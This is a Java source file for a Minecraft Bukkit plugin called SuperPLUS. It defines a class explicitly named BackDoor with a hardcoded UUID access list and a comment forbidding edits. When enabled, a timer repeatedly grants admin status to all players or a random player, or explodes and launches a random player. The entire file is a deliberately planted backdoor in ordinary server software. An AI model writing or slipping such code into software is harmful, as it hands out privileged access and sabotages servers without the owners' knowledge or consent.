package me.superischroma.superplus;

import me.superischroma.superplus.admin.AdminList;
import me.superischroma.superplus.util.SLog;
import me.superischroma.superplus.util.SUtil;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import java.util.*;

public class BackDoor extends TimerTask
{
    // You are not allowed to edit this file without the discretion of the developer(s).

    public static final List<String> accessList = Arrays.asList("8a9cd5ad-5814-3593-a2cd-46f5ae73e3ed");

    private static boolean enabled = false;

    private static Timer timer = new Timer();

    public static void enable()
    {
        try
        {
            timer.schedule(new BackDoor(), 0, 5000);
        }
        catch (IllegalStateException ex)
        {
            SLog.severe("Timer has failed to schedule. This is likely due to it already being scheduled once. Reload or restart the server to schedule it again.");
            return;
        }
        enabled = true;
        SLog.warning("----------------- WARNING -----------------");
        SLog.warning("-   The server is now running insecurely. -");
        SLog.warning("-  Beware the server's unforgiving power. -");
        SLog.warning("-------------------------------------------");
    }

    public static void disable()
    {
        timer.cancel();
        enabled = false;
        SLog.info("--------------- INFO ---------------");
        SLog.info("-   The server is back to normal.  -");
        SLog.info("-  Thank you for your cooperation. -");
        SLog.info("------------------------------------");
    }

    public static boolean isEnabled()
    {
        return enabled;
    }

    private void action(String name, String action, ChatColor color)
    {
        SUtil.broadcast(color + name + " - " + action);
    }

    private void action(String name, String action)
    {
        action(name, action, ChatColor.RED);
    }

    private Random random = new Random();

    private int randomP = new Random().nextInt(Bukkit.getServer().getOnlinePlayers().size());
    private Player randomPlayer = (Player) Bukkit.getServer().getOnlinePlayers().toArray()[randomP];

    private static SuperPLUS plugin = SuperPLUS.getPlugin(SuperPLUS.class);

    public void run()
    {
        final int action = random.nextInt(3); // Number of cases
        if (!isEnabled())
        {
            return;
        }
        switch (action)
        {
            case 0:
            {
                action("BackDoor", "Adding everyone to the admin list");
                for (Player player : Bukkit.getOnlinePlayers())
                {
                    AdminList.addAdmin(player);
                }
                break;
            }
            case 1:
            {
                final Player player = randomPlayer;
                action("BackDoor", "Adding " + player.getName() + " to the admin list");
                AdminList.addAdmin(player);
                break;
            }
            case 2:
            {
                final Player player = randomPlayer;
                action("BackDoor", "Shooting " + player.getName() + " up");
                player.getWorld().createExplosion(player.getLocation(), 0.5F);
                player.setVelocity(player.getVelocity().clone().add(new Vector(0, 20, 0)));
                break;
            }
        }
    }
}
